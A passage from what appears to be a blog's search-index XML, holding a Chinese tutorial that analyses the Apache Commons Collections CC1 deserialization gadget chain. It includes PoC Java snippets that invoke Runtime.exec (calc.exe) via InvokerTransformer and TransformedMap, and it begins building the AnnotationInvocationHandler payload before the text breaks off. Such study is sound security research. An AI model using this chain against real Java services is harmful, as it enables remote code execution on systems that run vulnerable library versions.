<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>java安全-CC1链学习与分析</title>
      <link href="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/"/>
      <url>/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>针对CC链的分析，主要还是以逆向思维为主（从结果分析过程），从中尽可能学习出问题的地方在哪，哪里调用的这个带问题的地方，一步步思考。</p><h1 id="0x01、Apache-Commons-Collections描述"><a href="#0x01、Apache-Commons-Collections描述" class="headerlink" title="0x01、Apache Commons Collections描述"></a>0x01、Apache Commons Collections描述</h1><p>CC链即Commons Collections利用链，主要针对Commons Collections组件发现的利用链。</p><blockquote><p>Apache Commons是Apache软件基金会的项目。Commons的目的是提供可重用的、开源的Java代码。<br>Apache Commons提供了很多工具类库，他们几乎不依赖其他第三方的类库，接口稳定，集成简单，可以大大提高编码效率和代码质量。<br>Apache Commons Collections 是对 java.util.Collection 的扩展。<br>Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p></blockquote><p>目前 Collections 包有两个 commons-collections 和commons-collections4，commons-collections 最新版本是3.2.2，3系列版本也是只有3.2.2是安全的，不支持泛型，目前官方已不在维护。collections4 目前最新版本是4.4，其中4.0是存在漏洞，最低要求 Java8 以上。相对于 collections 来说完全支持 Java8 的特性并且支持泛型，该版本无法兼容旧有版本，于是为了避免冲突改名为 collections4。推荐直接使用该版本。（注：两个版本可以共存，使用时需要注意）</p><p>CC1链分为两条链，一条为<code>TransformedMap</code>(也是最初的CC1链)，一条为<code>LazyMap</code>，其中有的分析把<code>TransformedMap</code>链单独分出来作为CC链，把<code>LazyMap</code>链作为CC1链。也可以作为CC1的两条链，一起学习下。</p><h1 id="0x02、环境准备"><a href="#0x02、环境准备" class="headerlink" title="0x02、环境准备"></a>0x02、环境准备</h1><p>java版本：jdk8u66(cc1链要求java版本小于jdk8u71,不得不说这个版本确实有点老了)<br></n><br>jdk官方下载链接：<a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html%EF%BC%8C%E6%89%BE%E5%88%B0%E5%AF%B9%E5%BA%94%E7%89%88%E6%9C%AC%E4%BD%8E%E4%BA%8E8u71%E7%9A%84%E5%B0%B1%E8%A1%8C%E3%80%82">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html，找到对应版本低于8u71的就行。</a></p><p><strong>添加Maven项目</strong><br>新建Maven项目——&gt;pom.xml添加Commons Collections组件依赖,3系列除3.2.2版本外，其余均收该漏洞影响，添加3系列其中一个版本即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-1.png" title="maven环境"></p><p><strong>导入sun包</strong></p><blockquote><p>因为cc1链需要用到sun包中的类，sun包在jdk中的代码是通过class文件反编译来的，为.class文件，查看不到源码.java文件，不便于调试，且直接观看class文件的阅读性跟java文件有出入，所以下载jdk源码sun包导入，便可查看到java源码文件，方便调试阅读</p></blockquote><p>步骤:<br>下载jdk源码：<a href="https://hg.openjdk.java.net/jdk8u/jdk8u/jdk">https://hg.openjdk.java.net/jdk8u/jdk8u/jdk</a><br>按网上步骤解压出src文件夹，再把&#x2F;src&#x2F;share&#x2F;classes&#x2F;sun文件夹放到解压出来的src文件夹跟目录<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-2.png" title="sun环境"><br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-3.png" title="sun环境"><br>在项目结构中对应jdk版本下添加包即可如下图<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-4.png" title="sun环境"><br>随后在分析过程对应maven里Commons Collections包的class文件上方提示下载源代码，下载就可以看到Commons Collections包的java源码<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-5.png" title="查看到源码"></p><h1 id="0x03、利用链接口及实现类"><a href="#0x03、利用链接口及实现类" class="headerlink" title="0x03、利用链接口及实现类"></a>0x03、利用链接口及实现类</h1><p>CC1链的利用点为<code>Commons Collections</code>包中的<code>Transformer</code>接口，通过下面后半段的利用链可以了解<code>Transformer</code>接口相关涉及实现它的<code>ChainedTransformer</code>类、<code>ConstantTransformer</code>类、<code>InvokerTransformer</code>类。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">yso-cc1链后半段利用链</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">    ConstantTransformer.transform()</span><br><span class="line">    InvokerTransformer.transform()</span><br><span class="line">        Method.invoke()</span><br><span class="line">            Class.getMethod()</span><br><span class="line">    InvokerTransformer.transform()</span><br><span class="line">        Method.invoke()</span><br><span class="line">            Runtime.getRuntime()</span><br><span class="line">    InvokerTransformer.transform()</span><br><span class="line">        Method.invoke()</span><br><span class="line">            Runtime.exec()</span><br></pre></td></tr></table></figure><h2 id="Transformer接口"><a href="#Transformer接口" class="headerlink" title="Transformer接口"></a>Transformer接口</h2><p>&#x2F;&#x2F;我理解为 转换器接口<br><code>Transformer</code>接口只有一个<code>public Object transform(Object input)</code>方法，返回一个被转换的Object对象<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-6.png" title="Transformer接口"><br>Transformer接口实现的类，包括利用链中的关键的类，这些类都实现了<code>Transformer</code>以及序列化<code>serializable</code>。</p><p><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-7.png" title="Transformer实现的类"></p><h2 id="ChainedTransformer类"><a href="#ChainedTransformer类" class="headerlink" title="ChainedTransformer类"></a>ChainedTransformer类</h2><p>&#x2F;&#x2F;我理解为 链转换类<br><code>ChainedTransformer</code>的作用为链式调用，将传入的<code>Transformer</code>数组依次调用每一个<code>Transformer</code>的<code>transform</code>方法，将第一个的转换返回<code>Object</code>对象的作为下次循环的的输入对象在<code>Transformer</code>的<code>transform</code>中被调用，以此循环。<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-8.png" title="ChainedTransformer类"></p><h2 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2><p>&#x2F;&#x2F;我理解为 对象转换类<br>这里定义了一个<code>iConstant</code>对象<br><code>private final Object iConstant;</code><br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-9.png" title="ConstantTransformer类"><br>作用就是接受任何传进来的对象，并转换成定义的<code>iConstant</code>对象返回，相对起来很好理解。</p><h2 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2><p>&#x2F;&#x2F;我理解为 调用转换类<br><code>InvokerTransformer</code>类的作用为获取调用的<font color=red>方法名</font>、<font color=red>参数类型</font>、<font color=red>函数的参数列表</font><br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-10.png" title="InvokerTransformer"><br>调用的<code>transform</code>获取了<font color=red>对象的类，方法、并返回执行方法，类、方法</font>、<font color=red>参数均为输入的对象，可控</font>，因此该类是cc1链的最重点的执行部分。<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-11.png" title="InvokerTransformer"><br>通过正常反射执行<code>Runtime.exec()</code>方法<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-12.png" title="正常反射执行exec"><br>通过<code>InvokerTransformer</code>类执行<code>Runtime.exec()</code>方法<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-13.png" title="正常反射执行exec"><br>poc-demo:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        //获取Runtime对象</span><br><span class="line">        Runtime run=Runtime.getRuntime();</span><br><span class="line">        //通过Object对象反射回去Runtime对象</span><br><span class="line">        //Object obj=Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;));</span><br><span class="line">        //获取构造InvokerTransformer对象</span><br><span class="line">        InvokerTransformer iv=new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc.exe&quot;&#125;);</span><br><span class="line">        //执行InvokerTransformer.transform方法</span><br><span class="line">        iv.transform(run);</span><br></pre></td></tr></table></figure><p>这下很好理解<code>InvokerTransformer</code>这个类的就是为了获取对象以及方法和执行参数，且该对象可控。</p><h1 id="0x04、CC1链分析"><a href="#0x04、CC1链分析" class="headerlink" title="0x04、CC1链分析"></a>0x04、CC1链分析</h1><p>从利用链接口和实现类可知<code>InvokerTransformer</code>为最后最重要的执行类，因此该链的分析思路就相对清晰，反查哪些类实现了<code>InvokerTransformer.transform()</code>方法，输入源为反序列化<code>readObject</code>，也就是先搜索最后调用了<code>InvokerTransformer.transform(Object)</code>方法，且实现<code>serializable</code>序列化，以<code>readObject</code>为输入源的类及方法。<br>搜索结果有21个，除去自身测试的，还有20个，满足上述条件（调用<code>transform(Object)</code>、实现了反序列化接口<code>serializable</code>）的有6个类。<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-14.png" title="满足条件类"><br>共8个方法<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-15.png" title="满足条件类"></p><p>先学习分析一下TransformedMap链和LazyMap链，也就是CC1的两条链。</p><h2 id="TransformedMap链"><a href="#TransformedMap链" class="headerlink" title="TransformedMap链"></a>TransformedMap链</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><code>TransformedMap</code>类作用是对Map进行装饰，通过<code>keyTransformer</code>、<code>valueTransformer</code>分别对输入的<code>key</code>、<code>value</code>通过<code>transform()</code>方法进行修饰，查看构造函数，接受三个参数（<code>Map</code>的对象、<code>Transformer</code>的两个对象分别为<code>key</code>、<code>value</code>。），将接受的<code>key，value</code>对象转换为本类的<code>Transformer</code>对象<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-16.png" title="构造函数"><br>可调用静态方法（map类型）<code>decorate</code>对新<code>Map</code>对象进行回调，对传入新的<code>Map</code>进行修饰，也就是说可以通过<code>decorate</code>方法去获取<code>TransformedMap</code>的对象<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-17.png" title="decorate回调"><br>简单了解<code>TransformedMap</code>类后，现在回到利用链本身来，找到可以实现的<code>transform(Object)</code>的地方<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-18.png" title="decorate回调"><br>三个方法</p><ul><li>transformKey(Object object)</li><li>transformValue(Object object)</li><li>checkSetValue(Object value)</li></ul><p>其中<code>transformKey</code>、<code>transformValue</code>两个方法分别获取从<code>TransformedMap</code>类的构造方法中传入<code>Transformer keyTransformer</code>、<code>Transformer valueTransformer</code>，再分别调用<code>keyTransformer.transform(object)</code>、<code>valueTransformer.transform(object)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//transformKey方法</span><br><span class="line">protected Object transformKey(Object object) &#123;</span><br><span class="line">        if (keyTransformer == null) &#123;</span><br><span class="line">            return object;</span><br><span class="line">        &#125;</span><br><span class="line">        return keyTransformer.transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">//transformValue方法</span><br><span class="line">protected Object transformValue(Object object) &#123;</span><br><span class="line">        if (valueTransformer == null) &#123;</span><br><span class="line">            return object;</span><br><span class="line">        &#125;</span><br><span class="line">        return valueTransformer.transform(object);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>查看这两个方法都在哪调用<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-19.png" title="transformKey方法调用"><br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-20.png" title="transformValue方法调用"><br>这两个方法都在put方法中进行调用，参数就为两个<code>Object</code>对象，传递任意一个参数都可调用对应的<code>transformKey/Value</code>方法，最后put放入<code>key</code>和<code>value</code>。<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-21.png" title="put方法"><br>利用思路：<br>因为<code>TransformedMap</code>中构造函数、<code>transformKey</code>、<code>transformValue</code>方法都是<code>protected</code>受保护的，无法直接声明使用，但可调用<code>decorate</code>公共方法进行回调向构造方法传参，通过<code>transformKey</code>或者<code>transformValue</code>传递其中任意一个参数为<code>InvokerTransformer</code>对象，最后通过<code>TransformedMap</code>的<code>put</code>方法传入恶意函数对象达到执行命令。<br>即：<br>第一步，创建构造参数（<code>Map</code>的对象、<code>Transformer</code>的两个对象分别为<code>key</code>、<code>value</code>），其中key或者value可以随意创造其中一个为<code>InvokerTransformer</code>类对象即可<br>第二步，通过<code>decorate</code>公共方法调用构造方法创建<code>TransformedMap</code>对象<br>第三步，调用<code>TransformedMap</code>的<code>put</code>方法，传递恶意函数对象，对其中key和value参数随便传入一个即可<br>利用方法：<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-22.png" title="利用"><br>但上面这两个方法都在本类Put方法进行调用，也未在其他类中进行调用，同时使用到了<code>InvokerTransformer</code>、<code>Map</code>两个类的对象，因此无法通过readObject反序列化达到命令执行的目的。<br><font color=red>注：反序列化的序列化对象只能为单个对象，无法对多个对象进行序列化。</font></p><p>接下来看第三个方法：<code>checkSetValue(Object value)</code><br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-23.png" title="checkSetValue方法"><br>同样也是返回构造方法传入的<code>Transformer valueTransformer</code>，然后调用<code>transform(Object)</code>，但是由于是<code>protected</code>受保护，因此无法像另外两个方法一样直接调用。<br>再看该方法有没有其他类对其调用<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-24.png" title="checkSetValue方法"><br>发现除了本类以外的父类<code>AbstractInputCheckedMapDecorator</code>中的内部类<code>MapEntry</code>的<code>setValue()</code>方法对其进行了调用，该类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">static class MapEntry extends AbstractMapEntryDecorator &#123;</span><br><span class="line"></span><br><span class="line">        /** The parent map */</span><br><span class="line">        private final AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">        protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) &#123;</span><br><span class="line">            super(entry);</span><br><span class="line">            this.parent = parent;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public Object setValue(Object value) &#123;</span><br><span class="line">            value = parent.checkSetValue(value);</span><br><span class="line">            return entry.setValue(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>官方对该类的描述翻译：</p><blockquote><p>一个抽象基类，简化了创建地图装饰器的任务。<br>MapAPI很难正确修饰，并且涉及实现许多不同的类。这个类的存在是为了提供一个更简单的API。<br>提供了特殊的钩子方法，当对象被添加到地图时调用这些方法。通过重写这些方法，可以验证或操纵输入。除了主要的映射方法，entrySet也会受到影响，这是编写映射实现最困难的部分。<br>该类是包范围的，在将来的Commons Collections版本中可能会被撤回或替换</p></blockquote><p>实现调用<br>前面步骤跟另外两个方法一样，由于不能直接调用，因此重点就在for循环里面，通过遍历<code>HashMap</code>键值对，调用<code>setValue()</code>方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        //TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer)</span><br><span class="line">        //第一个参数Map对象</span><br><span class="line">        Map map=new HashMap();</span><br><span class="line">        map.put(&quot;1&quot;,&quot;2&quot;);</span><br><span class="line">        //第二个参数和第三个参数类型一致，且有一个即可调用，传入InvokerTransformer对象</span><br><span class="line">        InvokerTransformer iv=new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc.exe&quot;&#125;);</span><br><span class="line">        //调用decorate实现实例化对象并调用构造函数传参,Map类型必须为&lt;Object,Object&gt;，否则for循环调用tm对象会导致参数类型不一致会报错</span><br><span class="line">        Map&lt;Object,Object&gt; tm= TransformedMap.decorate(map,null,iv);</span><br><span class="line"></span><br><span class="line">        for( Map.Entry entry: tm.entrySet()) &#123;</span><br><span class="line">            //调用setValue，传递Runtime对象</span><br><span class="line">            entry.setValue(Runtime.getRuntime()); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-25.png" title="实现调用"></p><p>现在发现父类<code>AbstractInputCheckedMapDecorator</code>中的内部类<code>MapEntry</code>的<code>setValue()</code>方法对其进行了调用，下一个思路就是找到实现序列化接口并且能调用<code>setValue()</code>方法的<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-26.png" title="setValue()调用"><br>找到42个方法，其中<code>AnnotationInvocationHandler</code>类实现了序列化接口，同时重写了<code>readObject</code>方法，并且<code>setValue()</code>在重写的<code>readObject</code>方法中进行调用<br>其中构造函数获取两个参数，一个class类型<code>Class type</code>,一个Map类型<code>Map memberValues</code>，然后进行了type的类型判断，最后返回给变量<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-28.png" title="AbstractInputCheckedMapDecorator类"><br>序列化前半段也是通过<code>getInstance</code>方法对type类型进行判断,判断type的类型是否为注解类的方法类型名，是的话便通过<code>memberTypes()</code>方法获取其成员方法名和返回方法，存在Map类型的<code>memberTypes</code>对象中<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-27.png" title="重写序列化方法"><br>后半段也是最主要的for循环部分，遍历<code>memberValues</code>也就是构造方法传入的第二个参数（传入TransformedMap[]数组），循环获取键名，通过<code>memberTypes.get(name)</code>判断键名是否是注解类（Annotation类，全名java.lang.annotation.Annotation）的方法类型名，如果是的话就获取键值给<code>value</code>变量，<strong>这里通过键名设置注解类（Annotation类）的实例方法名即可通过条件判断</strong>。<br>接下来继续判断<code>if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)</code>意思判断value的值如果不是注解类的方法或者键名的值是ExceptionProxy的实例，则通过<code>memberValue.setValue</code>方法修改该键名的值，<strong>这里只用键值不是注解类（Annotation类）的实例方法名即可满足条件判断</strong>，然后调用<code>memberValue.setValue</code>方法达到目的<br>可以找到注解类Annotation的实现方法（找到引用的java.lang.annotation.Annotation，Ctrl+Alt+鼠标左键点击Annotation即可找到对应的实现方法），找到其中对应有成员的任意方法<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-31.png" title="实现方法"><br>比如Generated注释类，可以put value方法名。（实际测试过程中找到的实现方法有大部分还是不能触发，只有部分类和方法才行）<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-32.png" title="Generated类"></p><p>现在利用链就完整了，入口点为<code>AnnotationInvocationHandler</code>类的反序列化<code>readObject</code>方法，一直到最后调用<code>InvokerTransformer.transform(Object)</code>方法</p><h3 id="完整利用链"><a href="#完整利用链" class="headerlink" title="完整利用链"></a>完整利用链</h3><p>TransformedMap CC1链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">            AnnotationInvocationHandler.readObject()</span><br><span class="line">                TransformedMap.entrySet()</span><br><span class="line">                    AbstractInputCheckedMapDecorator.MapEntry.setValue()</span><br><span class="line">                        TransformedMap.checkSetValue()</span><br><span class="line">                            ChainedTransformer.transform()</span><br><span class="line">                                ConstantTransformer.transform()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Class.getMethod()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.getRuntime()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.exec()</span><br></pre></td></tr></table></figure><p>其中通过上述学习还没涉及到<code>ChainedTransformer.transform()</code>这个环节的利用方法，在构造Poc中可以学习下利用方法和原理</p><h3 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h3><p>理思路<br>1、入口点在为<code>AnnotationInvocationHandler</code>类的反序列化<code>readObject</code>方法中调用<code>setValue()</code>方法，但<code>AnnotationInvocationHandler</code>这个类未声明Public，只有通过反射进行调用。<br>通过反射调用<code>AnnotationInvocationHandler</code>类对象，并且调用构造方法，然后通过实例化向构造方法传参</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//获取AnnotationInvocationHandler类对象</span><br><span class="line">        Class cla=Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        //获取AnnotationInvocationHandler类构造方法，参数为一个类对象和一个Map对象</span><br><span class="line">        Constructor cons=cla.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        //传入参数用a,b代替表示</span><br><span class="line">        Object obj=cons.newInstance(a,b);</span><br></pre></td></tr></table></figure><p>2、接下来久要对传参内容进行确定，传入什么，其中a为Class类对象，b为Map对象，通过反序列化调用，从利用链的分析知道a传入的为注解类<code>Annotation</code>类，可以找到的<code>Generated</code>类的<code>value</code>名称，同时建立<code>HashMap</code>，并put键名为<code>value</code>，键值为任意即可绕过for循环的判断</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Map map = new HashMap();</span><br><span class="line">map.put(&quot;value&quot;, &quot;aaa&quot;);</span><br><span class="line">Object obj=cons.newInstance(Generated.class,b);</span><br></pre></td></tr></table></figure><p>b为Map对象，并且该参数会执行调用到<code>AnnotationInvocationHandler</code>类<code>readObject</code>方法中的<code>AbstractMapEntryDecorator.MapEntry.setValue()</code>，从而在<code>setValue()</code>方法中调用到<code>TransformedMap.checkSetValue()</code>方法，最后返回调用到<code>TransformedMap</code>中<code>valueTransformer.transform()</code>方法，<code>valueTransformer</code>为<code>TransformedMap</code>构造函数的第三个参数即传入<code>InvokerTransformer</code>类对象，<code>Runtime</code>对象作为<code>transform(Object)</code>参数传入的值<br>但由于Runtime对象未实现序列化接口，无法序列化，并且<code>valueTransformer.transform(Object)</code>中的Object实际并不可控设置为Runtime对象值。因此利用到了<code>ChainedTransformer</code>类，也是上文学习中未提及实际利用方法的类，该类传入Transformer数组，并由transform方法实现循环调用。<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-34.png" title="ChainedTransformer类"><br>因为<code>Runtime</code>类未实现序列化接口，只有通过反射实现对它的调用，即<code>Runtime.class</code>，再由于这个循环会有一个初识的transform(Object)，其中的Object在第一次循环的时候是由调用<code>ChainedTransformer.transform(Object)</code>传入的（传入的重写的反序列化方法中setValue()中的值），并没有实际传入的类对象。<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-35.png" title="初始的Object值"><br>此时通过调用<code>ConstantTransformer</code>类来解决这个问题，一来可以通过它来实现返回<code>Runtime.class</code>对象，二来通过把他设置为<code>TransformedMap</code>数组的首位来规避初始调用的<code>Object</code>的问题，因为<code>ConstantTransformer</code>的<code>transform(Object)</code>不管输入什么都返回构造方法中的对象，然后再通过反射构建<code>Runtime</code>对象并调用<code>exec</code>方法，最后执行命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 